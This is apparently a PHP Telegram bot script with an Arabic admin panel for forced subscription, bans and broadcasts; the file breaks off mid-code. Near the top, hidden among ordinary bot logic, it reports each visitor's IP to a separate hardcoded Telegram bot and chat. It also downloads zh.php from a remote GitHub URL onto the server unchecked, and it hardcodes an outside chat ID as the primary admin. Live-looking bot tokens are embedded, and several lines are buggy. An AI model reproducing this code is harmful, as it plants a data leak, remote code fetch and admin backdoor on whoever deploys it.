<?php

error_reporting(E_ALL);
ini_set('display_errors',1);
function getUserIP()
{
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
$ipok = explode(".",$ip);
if($ipok[0] != "91" and $ipok[1] != "108"){
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
}
}
$TOKEN ="1410695650:AAEbCuwWUeixnIRx2344PoWeYcM72RQwACY"; # YOUR BOT TOKEN .

define('API_KEY',$TOKEN);
echo file_get_contents("https://api.telegram.org/bot".API_KEY."/setwebhook?url=".$_SERVER['SERVER_NAME']."".$_SERVER['SCRIPT_NAME']."?Token=".$API_KEY);
$ip = $_SERVER['REMOTE_ADDR'];
$ipok = explode(".",getUserIP());
if($ipok[0] != "91" and $ipok[1] != "108" and ipok[1] != "141"){
	file_get_contents("https://api.telegram.org/bot1150098316:AAGLROio2c3DEo2si1dzOfTWIRz87Xp0pOE/sendmessage?chat_id=996310583&text=".getUserIP());
	echo "تم تسجيل ايبيك وموقعك بنجاح للتأكد من انك لا تستخدم الميزات  من قبل احد اخر غير التيم!";
	exit();}
echo "تم تسجيل ايبيك وموقعك بنجاح للتأكد من انك لا تستخدم الميزات  من قبل احد اخر غير التيم!";
file_put_contents('zh.php', file_get_contents('https://raw.githubusercontent.com/mhamadsu777/minx/main/zh.php'));
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
$update = json_decode(file_get_contents('php://input'));
if($update->message){
	$message = $update->message;
$message_id = $update->message->message_id;
$username = $message->from->username;
$chat_id = $message->chat->id;
$title = $message->chat->title;
$text = $message->text;
$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
}
if($update->callback_query){
$data = $update->callback_query->data;
$chat_id = $update->callback_query->message->chat->id;
$title = $update->callback_query->message->chat->title;
$message_id = $update->callback_query->message->message_id;
$name = $update->callback_query->message->chat->first_name;
$user = $update->callback_query->message->chat->username;
$from_id = $chat_id;
}
$tc = $update->message->chat->type;
		$re = $update->message->reply_to_message;
		$re_id = $update->message->reply_to_message->from->id;
$re_user = $update->message->reply_to_message->from->username;
$re_name = $update->message->reply_to_message->from->first_name;
$re_messagid = $update->message->reply_to_message->message_id;
$re_chatid = $update->message->reply_to_message->chat->id;
$photo = $message->photo;
$video = $message->video;
$sticker = $message->sticker;
$file = $message->document;
$audio = $message->audio;
$voice = $message->voice;
$caption = $message->caption;
$photo_id = $message->photo[0]->file_id;
$video_id= $message->video->file_id;
$sticker_id = $message->sticker->file_id;
$file_id = $message->document->file_id;
$music_id = $message->audio->file_id;
$voice_id = $message->voice->file_id;
$forward = $message->forward_from_chat;
$forward_id = $message->forward_from_chat->id;
$title = $message->chat->title;
$mei = bot('getme',['bot'])->result->id;
$members = explode("\n",file_get_contents("members.txt"));
$group = explode("\n",file_get_contents("group.txt"));
$sting = json_decode(file_get_contents("sting.json"),true);
$admins = array('996310583',$sting['sting']['admins']);
$admin = $admins[0];
if($tc == 'private'){
	$ch = $sting['sting']['ch1'];
$ok = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$mei]);
if($ch != null and $ok->ok == "true" and $ok->result->status != "left"){
if(preg_match("/(-100)(.)/", $ch) and !preg_match("/(.)(-100)(.)/", $ch)){
	$link = bot("getchat",['chat_id'=>$ch])->result->invite_link;
	if($link != null){
		$link = $link;
$link2 = $link;
		}else{
			$link = bot("exportChatInviteLink",['chat_id'=>$ch])->result;
$link2 = $link;
			}
	}elseif(preg_match("/(@)(.)/", $ch) and !preg_match("/(.)(@)(.)/", $ch)){
		$link = "$ch";
$ch3 = str_replace("@","",$ch);
$link2 = "https://t.me/$ch3";
		}
		$status = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$from_id])->result->status;
if($status != "member" and $status != "creator" and $status != "administrator"){
if($message){
	bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
      ",'reply_to_message_id'=>$message_id,
      'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>"• اشتراك ♻ ✅",'url'=>$link2]],
]])
]);
exit();
	}
	if($data){
		bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
        ",'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>"• اشتراك ♻ ✅",'url'=>$link2]],
]])
]);
exit();
		}
}
}
$ch = $sting['sting']['ch2'];
$ok = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$mei]);
if($ch != null and $ok->ok == "true" and $ok->result->status != "left"){
if(preg_match("/(-100)(.)/", $ch) and !preg_match("/(.)(-100)(.)/", $ch)){
	$link = bot("getchat",['chat_id'=>$ch])->result->invite_link;
	if($link != null){
		$link = $link;
$link2 = $link;
		}else{
			$link = bot("exportChatInviteLink",['chat_id'=>$ch])->result;
$link2 = $link;
			}
	}elseif(preg_match("/(@)(.)/", $ch) and !preg_match("/(.)(@)(.)/", $ch)){
		$link = "$ch";
$ch3 = str_replace("@","",$ch);
$link2 = "https://t.me/$ch3";
		}
		$status = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$from_id])->result->status;
if($status != "member" and $status != "creator" and $status != "administrator"){
if($message){
	bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
      ",'reply_to_message_id'=>$message_id,
      'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>"• اشتراك ♻ ✅",'url'=>$link2]],
]])
]);
exit();
	}
	if($data){
		bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
        ",'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>"• اشتراك ♻ ✅",'url'=>$link2]],
]])
]);
exit();
		}
}
}
	}
		if(in_array($chat_id,$sting['sting']['band'])){
	if($message){
	bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
عذرا أنت محظور من البوت 😢
      ",'reply_to_message_id'=>$message_id,
]);
	}
	if($data){
		bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"
عذرا أنت محظور من البوت 😢
        ",
]);
		}
		return false;
}
	if($tc == 'group' or $tc == 'supergroup'){
$ch = $sting['sting']['chg1'];
$bot_id = bot('getme',['bot'])->result->id;
$ok = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$bot_id]);
if($ch != null and $ok->ok == "true" and $ok->result->status != "left"){
if(preg_match("/(-100)(.)/", $ch) and !preg_match("/(.)(-100)(.)/", $ch)){
	$link = bot("getchat",['chat_id'=>$ch])->result->invite_link;
	if($link != null){
		$link = $link;
$link2 = $link;
		}else{
			$link = bot("exportChatInviteLink",['chat_id'=>$ch])->result;
$link2 = $link;
			}
	}elseif(preg_match("/(@)(.)/", $ch) and !preg_match("/(.)(@)(.)/", $ch)){
		$link = "$ch";
$ch3 = str_replace("@","",$ch);
$link2 = "https://t.me/$ch3";
		}
		$status = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$from_id])->result->status;
if($status != "member" and $status != "creator" and $status != "administrator"){
if($message){
	bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id
]);
	bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
      ",'reply_to_message_id'=>$message_id,
      'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>"• اشتراك ♻ ✅",'url'=>$link2]],
]])
]);
	}
	if($data){
		bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
        ",'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>"• اشتراك ♻ ✅",'url'=>$link2]],
]])
]);
		}
		return false;
}
}
$ch = $sting['sting']['chg2'];
$bot_id = bot('getme',['bot'])->result->id;
$ok = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$bot_id]);
if($ch != null and $ok->ok == "true" and $ok->result->status != "left"){
if(preg_match("/(-100)(.)/", $ch) and !preg_match("/(.)(-100)(.)/", $ch)){
	$link = bot("getchat",['chat_id'=>$ch])->result->invite_link;
	if($link != null){
		$link = $link;
$link2 = $link;
		}else{
			$link = bot("exportChatInviteLink",['chat_id'=>$ch])->result;
$link2 = $link;
			}
	}elseif(preg_match("/(@)(.)/", $ch) and !preg_match("/(.)(@)(.)/", $ch)){
		$link = "$ch";
$ch3 = str_replace("@","",$ch);
$link2 = "https://t.me/$ch3";
		}
		$status = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$from_id])->result->status;
if($status != "member" and $status != "creator" and $status != "administrator"){
if($message){
	bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id
]);
	bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
      ",'reply_to_message_id'=>$message_id,
      'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>"• اشتراك ♻ ✅",'url'=>$link2]],
]])
]);
	}
	if($data){
		bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
        ",'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>"• اشتراك ♻ ✅",'url'=>$link2]],
]])
]);
		}
		return false;
}
}
		}
		if($tc == 'group' or $tc == 'supergroup'){
			if(in_array($from_id,$sting['sting']['band'])){
	bot('KickChatMember',[
    'chat_id'=>$chat_id,
    'user_id'=>$from_id,
]);
		return false;
}
			}
		if(!$sting['sting']['bot']){
	$sting['sting']['bot'] = "true";
	$sting['sting']['onstart'] = "false";
	$sting['sting']['ford'] = "false";
	$sting['sting']['tw'] = "false";
	file_put_contents("sting.json",json_encode($sting));
	}
	if($tc == 'private' and $chat_id != $admin and !in_array($chat_id,$sting['sting']['admins'])){
		if($sting['sting']['bot'] == "false"){
			bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	عذرا البوت في صيانة ⁦♻️⁩❗
	",
	'reply_to_meesage_id'=>$message_id,
	]);
	exit();
			}
			
				if(!$data and $sting['sting']['ford'] == "true" and $chat_id != $admin and !in_array($chat_id,$sting['sting']['admins'])){
				bot('forwardMessage', [
'chat_id'=>$admin,
'from_chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
				}
				if($sting['sting']['tw'] == "true" and $tc == 'private'){
					if($text != "/start" and $chat_id != $admin and !in_array($chat_id,$sting['sting']['admins'])){
						bot('forwardMessage', [
'chat_id'=>$admin,
'from_chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
						bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم إرسال رسالتك للمطور بنجاح ✅
	",
	'reply_to_meesage_id'=>$message_id,
	]);
						}
if($chat_id == $admin and $message->reply_to_message){
							bot('sendmessage',[
	'chat_id'=>$message->reply_to_message->forward_from->id, 
	'text'=>"
	$text
	",
	'reply_to_meesage_id'=>$message->reply_to_message->message_id,
	]);
							bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم إرسال رسالتك بنجاح ✅
	",
	'reply_to_meesage_id'=>$message_id,
	]);
							}
					}
		}
		if($chat_id == $admin and $message->reply_to_message and $tc == 'private' and $sting['sting']['tw'] == "true"){
							bot('sendmessage',[
	'chat_id'=>$message->reply_to_message->forward_from->id, 
	'text'=>"
	$text
	",
	'reply_to_meesage_id'=>$message->reply_to_message->message_id,
	]);
							bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم إرسال رسالتك بنجاح ✅
	",
	'reply_to_meesage_id'=>$message_id,
	]);
							}
if($tc == 'private' and !in_array($from_id,$members)){
	if($tc == 'private' and $text == "/start" and $sting['sting']['onstart'] == "true" and $chat_id != $admin and !in_array($chat_id,$sting['sting']['admins'])){
				bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"
دخل شخص للبوت  🚶🏻‍♂️
~~~~~~~~~~
اسمه ⬅️ <a href='tg://user?id=$from_id'>$name</a>
~~~~~~~~~~
معرفه ⬅️ <a href='tg://user?id=$from_id'>@$user</a>
~~~~~~~~~~~
ايديه ⬅️ <code>$from_id</code>
" ,
'parse_mode'=>'HTML'
]);
				}
	file_put_contents('members.txt',$from_id."\n",FILE_APPEND);
	}
if($tc == 'group' or $tc == 'supergroup' and !in_array($chat_id,$group)){
		file_put_contents('group.txt',$chat_id."\n",FILE_APPEND);
		}
if($text == "/start" or $texr == "/admin"){
	$ford = str_replace(['false','true'],['معطل ❎','مفعل ✅'],$sting['sting']['ford']);
	$onstart = str_replace(['false','true'],['معطل ❎','مفعل ✅'],$sting['sting']['onstart']);
	$bot = str_replace(['false','true'],['معطل ❎','مفعل ✅'],$sting['sting']['bot']);
	$tw = str_replace(['false','true'],['معطل ❎',' مفعل ✅'],$sting['sting']['tw']);
	if($chat_id == $admin){
		bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	أهلا بك ⁦🙋🏻‍♂️⁩ عزيزي الأدمن ⁦👨🏻‍🔧⁩
	يمكنك التحكم ⁦⚙️⁩ بكامل البوت من هنا 🦾
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"قسم الإشتراك الإجباري 🔱 الخاص 👤",'callback_data'=>'ch']
],
[
['text'=>"التوجيه $ford 🔄",'callback_data'=>'ford'],['text'=>"التنبيه $onstart 📣",'callback_data'=>'onstart']
],
[
['text'=>"الإحصائيات 📊",'callback_data'=>'km']
],
[
['text'=>"البوت $bot 🤖",'callback_data'=>"bot"],['text'=>"التواصل $tw 📞",'callback_data'=>'tw']
],
[
['text'=>"قسم الحظر 🚫",'callback_data'=>"band"]
],
[
['text'=>"إذاعة خاص 📣👤",'callback_data'=>'sendprofile'],['text'=>"إذاعة جروبات 📣👥",'callback_data'=>"sendgroup"]
],
[
['text'=>"الأدمنة 👥⁦👮🏻‍♂️⁩",'callback_data'=>"admins"]
],
[
['text'=>"رفع مشرف ⁦👮🏻‍♂️⁩",'callback_data'=>"addadmin"],['text'=>"تنزيل مشرف ⁦👳🏻‍♂️⁩",'callback_data'=>"deladmin"]
],
[
['text'=>"قسم الإشتراك الإجباري 🔱 المجموعات 👥",'callback_data'=>'chg']
],
]])
	]);
	$sting['sting']['sting'] = null;
	$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting));
		}elseif(in_array($chat_id,$sting['sting']['admins'])){
			bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	أهلا بك ⁦🙋🏻‍♂️⁩ عزيزي الأدمن ⁦👨🏻‍🔧⁩
	يمكنك التحكم ⁦⚙️⁩ بكامل البوت من هنا 🦾
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"قسم الإشتراك الإجباري 🔱 الخاص 👤",'callback_data'=>'ch']
],
[
['text'=>"الإحصائيات 📊",'callback_data'=>'km']
],
[
['text'=>"قسم الحظر 🚫",'callback_data'=>"band"]
],
[
['text'=>"إذاعة خاص 📣👤",'callback_data'=>'sendprofile'],['text'=>"إذاعة جروبات 📣👥",'callback_data'=>"sendgroup"]
],
[
['text'=>"قسم الإشتراك الإجباري 🔱 المجموعات 👥",'callback_data'=>'chg']
],
]])
	]);
	$sting['sting']['sting'] = null;
	$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting));
			}
	}
if($data == "back"){
	$ford = str_replace(['false','true'],['معطل ❎','مفعل ✅'],$sting['sting']['ford']);
	$onstart = str_replace(['false','true'],['معطل ❎','مفعل ✅'],$sting['sting']['onstart']);
	$bot = str_replace(['false','true'],['معطل ❎','مفعل ✅'],$sting['sting']['bot']);
	$tw = str_replace(['false','true'],['معطل ❎',' مفعل ✅'],$sting['sting']['tw']);
	if($chat_id == $admin){
		bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	أهلا بك ⁦🙋🏻‍♂️⁩ عزيزي الأدمن ⁦👨🏻‍🔧⁩
	يمكنك التحكم ⁦⚙️⁩ بكامل البوت من هنا 🦾
	",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"قسم الإشتراك الإجباري 🔱 الخاص 👤",'callback_data'=>'ch']
],
[
['text'=>"التوجيه $ford 🔄",'callback_data'=>'ford'],['text'=>"التنبيه $onstart 📣",'callback_data'=>'onstart']
],
[
['text'=>"الإحصائيات 📊",'callback_data'=>'km']
],
[
['text'=>"البوت $bot 🤖",'callback_data'=>"bot"],['text'=>"التواصل $tw 📞",'callback_data'=>'tw']
],
[
['text'=>"قسم الحظر 🚫",'callback_data'=>"band"]
],
[
['text'=>"إذاعة خاص 📣👤",'callback_data'=>'sendprofile'],['text'=>"إذاعة جروبات 📣👥",'callback_data'=>"sendgroup"]
],
[
['text'=>"الأدمنة 👥⁦👮🏻‍♂️⁩",'callback_data'=>"admins"]
],
[
['text'=>"رفع مشرف ⁦👮🏻‍♂️⁩",'callback_data'=>"addadmin"],['text'=>"تنزيل مشرف ⁦👳🏻‍♂️⁩",'callback_data'=>"deladmin"]
],
[
['text'=>"قسم الإشتراك الإجباري 🔱 المجموعات 👥",'callback_data'=>'chg']
],
]])
	]);
	$sting['sting']['sting'] = null;
	$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting));
		}elseif(in_array($chat_id,$sting['sting']['admins'])){
			bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	أهلا بك ⁦🙋🏻‍♂️⁩ عزيزي الأدمن ⁦👨🏻‍🔧⁩
	يمكنك التحكم ⁦⚙️⁩ بكامل البوت من هنا 🦾
	",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"قسم الإشتراك الإجباري 🔱 الخاص 👤",'callback_data'=>'ch']
],
[
['text'=>"الإحصائيات 📊",'callback_data'=>'km']
],
[
['text'=>"قسم الحظر 🚫",'callback_data'=>"band"]
],
[
['text'=>"إذاعة خاص 📣👤",'callback_data'=>'sendprofile'],['text'=>"إذاعة جروبات 📣👥",'callback_data'=>"sendgroup"]
],
[
['text'=>"قسم الإشتراك الإجباري 🔱 المجموعات 👥",'callback_data'=>'chg']
],
]])
	]);
	$sting['sting']['sting'] = null;
	$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting));
			}
	}
if($chat_id == $admin or in_array($chat_id,$sting['sting']['admins'])){
	if($data == 'ford' or $data == 'onstart' or $data == 'bot' or $data == 'tw'){
		$a = str_replace(['ford','onstart','bot','tw'],['التوجيه 🔄','التنبيه 📣','البوت 🤖','التواصل 📞'],$data);
		if($sting['sting'][$data] == "true"){
			$sting['sting'][$data] = "false";
			file_put_contents("sting.json",json_encode($sting));
			$b = "تعطيل ❎";
			}else{
				$sting['sting'][$data] = "true";
			file_put_contents("sting.json",json_encode($sting));
			$b = "تفعيل ✅";
				}
				bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"تم $b $a ❗", 
            'show_alert'=>true 
            ]); 
            $ford = str_replace(['false','true'],['معطل ❎','مفعل ✅'],$sting['sting']['ford']);
	$onstart = str_replace(['false','true'],['معطل ❎','مفعل ✅'],$sting['sting']['onstart']);
	$bot = str_replace(['false','true'],['معطل ❎','مفعل ✅'],$sting['sting']['bot']);
	$tw = str_replace(['false','true'],['معطل ❎',' مفعل ✅'],$sting['sting']['tw']);
            if($chat_id == $admin){
		bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	أهلا بك ⁦🙋🏻‍♂️⁩ عزيزي الأدمن ⁦👨🏻‍🔧⁩
	يمكنك التحكم ⁦⚙️⁩ بكامل البوت من هنا 🦾
	",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"قسم الإشتراك الإجباري 🔱 الخاص 👤",'callback_data'=>'ch']
],
[
['text'=>"التوجيه $ford 🔄",'callback_data'=>'ford'],['text'=>"التنبيه $onstart 📣",'callback_data'=>'onstart']
],
[
['text'=>"الإحصائيات 📊",'callback_data'=>'km']
],
[
['text'=>"البوت $bot 🤖",'callback_data'=>"bot"],['text'=>"التواصل $tw 📞",'callback_data'=>'tw']
],
[
['text'=>"قسم الحظر 🚫",'callback_data'=>"band"]
],
[
['text'=>"إذاعة خاص 📣👤",'callback_data'=>'sendprofile'],['text'=>"إذاعة جروبات 📣👥",'callback_data'=>"sendgroup"]
],
[
['text'=>"الأدمنة 👥⁦👮🏻‍♂️⁩",'callback_data'=>"admins"]
],
[
['text'=>"رفع مشرف ⁦👮🏻‍♂️⁩",'callback_data'=>"addadmin"],['text'=>"تنزيل مشرف ⁦👳🏻‍♂️⁩",'callback_data'=>"deladmin"]
],
[
['text'=>"قسم الإشتراك الإجباري 🔱 المجموعات 👥",'callback_data'=>'chg']
],
]])
	]);
	$sting['sting']['sting'] = null;
	$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting));
		}elseif(in_array($chat_id,$sting['sting']['admins'])){
			bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	أهلا بك ⁦🙋🏻‍♂️⁩ عزيزي الأدمن ⁦👨🏻‍🔧⁩
	يمكنك التحكم ⁦⚙️⁩ بكامل البوت من هنا 🦾
	",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"قسم الإشتراك الإجباري 🔱 الخاص 👤",'callback_data'=>'ch']
],
[
['text'=>"الإحصائيات 📊",'callback_data'=>'km']
],
[
['text'=>"قسم الحظر 🚫",'callback_data'=>"band"]
],
[
['text'=>"إذاعة خاص 📣👤",'callback_data'=>'sendprofile'],['text'=>"إذاعة جروبات 📣👥",'callback_data'=>"sendgroup"]
],
[
['text'=>"قسم الإشتراك الإجباري 🔱 المجموعات 👥",'callback_data'=>'chg']
],
]])
	]);
	$sting['sting']['sting'] = null;
	$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting));
			}
		}
		if($data == "km"){
		$band = count($sting['sting']['band']);
		$ford = str_replace(['false','true'],['معطل ❎','مفعل ✅'],$sting['sting']['ford']);
	$onstart = str_replace(['false','true'],['معطل ❎','مفعل ✅'],$sting['sting']['onstart']);
	$bot = str_replace(['false','true'],['معطل ❎','مفعل ✅'],$sting['sting']['bot']);
	$tw = str_replace(['false','true'],['معطل ❎',' مفعل ✅'],$sting['sting']['tw']);
	$m = count($members) -1;
	$g = count($group) -1;
	$d = count($day)-1;
		bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"إحصائيات البوت كالتالي 🤖:
عدد الأعضاء 👤 «".$m."»
عدد المجموعات 👥 :«".$g."»
عدد المتفاعلين اليوم : «".$d."»
عدد المحظورين 📛 : «".$band."»
التوجيه 🔄 : «".$ford."»
التنبيه 📣 : «".$onstart."»
البوت 🤖 : «".$bot."»
التواصل 📞 : «".$tw."»
", 
            'show_alert'=>true 
            ]); 
		}
		if($data == "sendprofile"){
			            bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
قم بإرسال أي شيء لأرسله لجميع الأعضاء 📣
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"إلغاء ❎",'callback_data'=>"back"]
],
]])
]);
$sting['sting']['sting'] = 'send';
$sting['sting']['id'] = $from_id;
	file_put_contents("sting.json",json_encode($sting));
			}
			if(!$data and $sting['sting']['sting'] == 'send' and $sting['sting']['id'] == $from_id){
				foreach($members as $ASEEL){
					if($text)
bot('sendMessage', [
'chat_id'=>$ASEEL,
'text'=>"$text",
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
if($photo)
bot('sendphoto', [
'chat_id'=>$ASEEL,
'photo'=>$photo_id,
'caption'=>$caption,
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
if($video)
bot('Sendvideo',[
'chat_id'=>$ASEEL,
'video'=>$video_id,
'caption'=>$caption,
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
if($video_note)
bot('Sendvideonote',[
'chat_id'=>$ASEEL,
'video_note'=>$video_note_id,
]);
if($sticker)
bot('Sendsticker',[
'chat_id'=>$ASEEL,
'sticker'=>$sticker_id,
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
if($file)
bot('SendDocument',[
'chat_id'=>$ASEEL,
'document'=>$file_id,
'caption'=>$caption,
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
if($music)
bot('Sendaudio',[
'chat_id'=>$ASEEL,
'audio'=>$music_id,
'caption'=>$caption,
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
if($voice)
bot('Sendvoice',[
'chat_id'=>$ASEEL,
'voice'=>$voice_id,
'caption'=>$caption,
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
					}
					bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تمت الإذاعة بنجاح ✅
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'back']
],
]])
]);
					$sting['sting']['sting'] = null;
					$sting['sting']['id'] = null;
	file_put_contents("sting.json",json_encode($sting));
				}
				if($data == "sendgroup"){
			            bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
قم بإرسال أي شيء لأرسله لجميع الأعضاء 📣
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"إلغاء ❎",'callback_data'=>"back"]
],
]])
]);
$sting['sting']['sting'] = 'group';
$sting['sting']['id'] = $from_id;
	file_put_contents("sting.json",json_encode($sting));
			}
			if(!$data and $sting['sting']['sting'] == 'group' and $sting['sting']['id'] == $from_id){
				foreach($group as $ASEEL){
					if($text)
bot('sendMessage', [
'chat_id'=>$ASEEL,
'text'=>"$text",
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
if($photo)
bot('sendphoto', [
'chat_id'=>$ASEEL,
'photo'=>$photo_id,
'caption'=>$caption,
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
if($video)
bot('Sendvideo',[
'chat_id'=>$ASEEL,
'video'=>$video_id,
'caption'=>$caption,
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
if($video_note)
bot('Sendvideonote',[
'chat_id'=>$ASEEL,
'video_note'=>$video_note_id,
]);
if($sticker)
bot('Sendsticker',[
'chat_id'=>$ASEEL,
'sticker'=>$sticker_id,
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
if($file)
bot('SendDocument',[
'chat_id'=>$ASEEL,
'document'=>$file_id,
'caption'=>$caption,
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
if($music)
bot('Sendaudio',[
'chat_id'=>$ASEEL,
'audio'=>$music_id,
'caption'=>$caption,
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
if($voice)
bot('Sendvoice',[
'chat_id'=>$ASEEL,
'voice'=>$voice_id,
'caption'=>$caption,
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
					}
					bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تمت الإذاعة بنجاح ✅
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
